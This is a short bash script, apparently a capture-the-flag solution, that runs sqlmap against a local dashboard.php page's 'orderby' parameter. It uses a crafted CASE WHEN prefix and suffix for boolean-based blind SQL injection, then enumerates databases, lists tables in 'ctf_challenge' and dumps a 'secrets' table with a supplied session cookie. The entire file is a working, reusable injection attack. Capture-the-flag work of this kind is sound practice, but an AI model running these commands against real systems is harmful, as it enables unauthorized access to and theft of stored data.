if [ -z "$1" ]; then
    echo "Usage: $0 <PHPSESSID>"
    echo "Example: $0 abc123def456"
    exit 1
fi

PHPSESSID=$1
URL="http://localhost:8080/dashboard.php?orderby=id"

echo "[*] Make sure you have created 2 entries: 'ZZZ' first, then 'AAA'"
echo ""

echo "=== STEP 1: Enumerating databases ==="
sqlmap -u "$URL" \
    --cookie="PHPSESSID=$PHPSESSID" \
    -p orderby \
    --technique=B \
    --prefix="(CASE WHEN (" \
    --suffix=") THEN id ELSE name END)" \
    --dbms=mysql \
    --string=">ZZZ<" \
    --dbs \
    --batch \
    --threads=4 \
    --flush-session \
    --fresh-queries

echo ""
echo "=== STEP 2: Enumerating tables in ctf_challenge ==="
sqlmap -u "$URL" \
    --cookie="PHPSESSID=$PHPSESSID" \
    -p orderby \
    --technique=B \
    --prefix="(CASE WHEN (" \
    --suffix=") THEN id ELSE name END)" \
    --dbms=mysql \
    --string=">ZZZ<" \
    -D ctf_challenge \
    --tables \
    --batch \
    --threads=4 \
    --fresh-queries

echo ""
echo "=== STEP 3: Dumping secrets table ==="
sqlmap -u "$URL" \
    --cookie="PHPSESSID=$PHPSESSID" \
    -p orderby \
    --technique=B \
    --prefix="(CASE WHEN (" \
    --suffix=") THEN id ELSE name END)" \
    --dbms=mysql \
    --string=">ZZZ<" \
    -D ctf_challenge \
    -T secrets \
    --dump \
    --batch \
    --threads=4 \
    --fresh-queries

echo ""
